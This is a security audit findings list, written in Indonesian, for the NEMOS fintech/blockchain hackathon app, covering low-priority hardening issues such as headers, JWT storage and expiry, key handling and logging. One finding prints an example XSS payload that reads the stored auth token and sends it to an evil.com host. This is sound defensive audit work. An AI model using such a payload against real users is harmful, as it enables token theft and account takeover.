# SPRINT 6 — P3 LOW: HARDENING & BEST PRACTICES FINDINGS

> **Audit Mode:** READ-ONLY & EXPLOITATION
> **Auditor Role:** Lead DevSecOps
> **Date:** 2026-04-02

---

## Active Findings

- [ ] **[BP-P3-01] [Security] Tidak Ada Helmet Middleware**
  **Lokasi:** `app.ts` — Tidak menggunakan `helmet` npm package untuk mengatur HTTP security headers:
  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `Strict-Transport-Security`
  - `X-XSS-Protection`
  **Dampak:** LOW — Tanpa headers ini, aplikasi lebih rentan terhadap clickjacking, MIME sniffing, dan XSS reflection.
  **Rekomendasi:** `npm install helmet` dan tambahkan `app.use(helmet())` sebelum CORS.

---

- [ ] **[BP-P3-02] [Auth] JWT Expiry 7 Hari Terlalu Panjang untuk Platform Finansial**
  **Lokasi:** `env.ts:43` — `JWT_EXPIRES_IN: "7d"` (default).
  **Dampak:** Jika token di-leak (misal dari shared computer, XSS, atau screenshot localStorage), penyerang punya akses selama 7 hari penuh.
  **Rekomendasi:** Turunkan ke `"24h"` atau `"4h"` dengan refresh token mechanism. Untuk hackathon, `"7d"` masih acceptable.

---

- [ ] **[BP-P3-03] [Frontend] Zustand Menyimpan JWT Token di localStorage — XSS Vulnerable**
  **Lokasi:** `auth.store.js:119-124` — `persist` middleware menyimpan `{ user, token }` ke `localStorage` dengan key `"nemos-auth-storage"`.
  **Eksploitasi:** Jika ada XSS vulnerability apapun di React app (misal dari dangerouslySetInnerHTML pada user generated content), penyerang bisa:
  ```js
  // XSS payload:
  new Image().src = 'https://evil.com/steal?token=' + JSON.parse(localStorage.getItem('nemos-auth-storage')).state.token
  ```
  **Dampak:** LOW (saat ini tidak ada XSS vector yang teridentifikasi di NEMOS karena tidak ada user-controlled HTML). Tapi secara arsitektural, `httpOnly cookie` lebih aman dari localStorage.
  **Rekomendasi:** Migrasi token storage ke `httpOnly` cookie yang di-set oleh backend.

---

- [ ] **[BP-P3-04] [Frontend] CORS Origin Hardcoded — Tidak Skalabel**
  **Lokasi:** `app.ts:23-27` — CORS origins di-hardcode dalam array. Jika domain berubah atau ada staging environment, developer harus mengubah kode.
  **Rekomendasi:** Pindahkan ke environment variable `CORS_ORIGINS` yang di-split oleh koma.

---

- [ ] **[BP-P3-05] [Blockchain] Relayer Private Key di Memory — Process Dump Risk**
  **Lokasi:** `blockchain.service.ts:32` — `new ethers.Wallet(env.RELAYER_PRIVATE_KEY, provider)` memuat private key ke memory process. Jika server ter-compromise dan attacker bisa melakukan memory dump, private key terekspose.
  **Dampak:** LOW untuk hackathon (Amoy testnet, MATIC gratis). CRITICAL jika di-deploy ke mainnet.
  **Rekomendasi (Produksi):** Gunakan Hardware Security Module (HSM) atau Managed Key Service (AWS KMS / GCP Cloud HSM).

---

- [ ] **[BP-P3-06] [Queue] BullMQ Retry 3x Tanpa Alert — Silent Payment Failures**
  **Lokasi:** `queue.service.ts:33` — `attempts: 3` dengan exponential backoff. `payment.worker.ts:133` hanya melakukan `console.error` pada failed jobs.
  **Dampak:** Jika payment job gagal 3 kali (DB down, network issue), job masuk ke failed state tanpa notifikasi. Investor sudah bayar via QRIS tapi investasi tidak tercatat.
  **Rekomendasi:** Tambahkan dead-letter queue handler dan alerting (Discord webhook / email) untuk failed payment jobs.

---

- [ ] **[BP-P3-07] [Frontend] Console Logging Masih Aktif di Production Code**
  **Lokasi:** Seluruh backend `console.log()` dan `console.error()` — tidak ada conditional logging berdasarkan `NODE_ENV`.
  **Dampak:** LOW — Performance overhead minimal, tapi log pollution di production dan possible information leak via server logs.
  **Rekomendasi:** Gunakan structured logging library (Winston/Pino) dengan level-based filtering.

---

- [ ] **[BP-P3-08] [Database] Schema Prisma Tidak Memiliki Index pada Field yang Sering Di-query**
  **Lokasi:** `schema.prisma` — Field-field berikut sering digunakan di `WHERE` clause tapi tidak memiliki `@index`:
  - `Transaction.status` — digunakan di `findMany({ where: { status: { in: [...] } } })` di merkle.worker.ts
  - `Investment.status` — digunakan di `where: { status: "ACTIVE" }` di umkm.routes.ts
  - `Transaction.createdAt` — digunakan di range query di merkle.worker.ts
  **Dampak:** Sequential scan pada tabel besar → query semakin lambat seiring pertumbuhan data.
  **Rekomendasi:** Tambahkan `@@index([status])` pada model Transaction dan Investment.
  **CATATAN:** Ini memerlukan perubahan `schema.prisma` yang saat ini DILARANG. Catat untuk Sprint 7.

---

## Previously Fixed

- [x] **[L-01] Autocomplete attribute** → ✅ Added
- [x] **[L-02] Console DOM warning** → ✅ Fixed
- [x] **[L-03] Toggle overlap** → ✅ Fixed
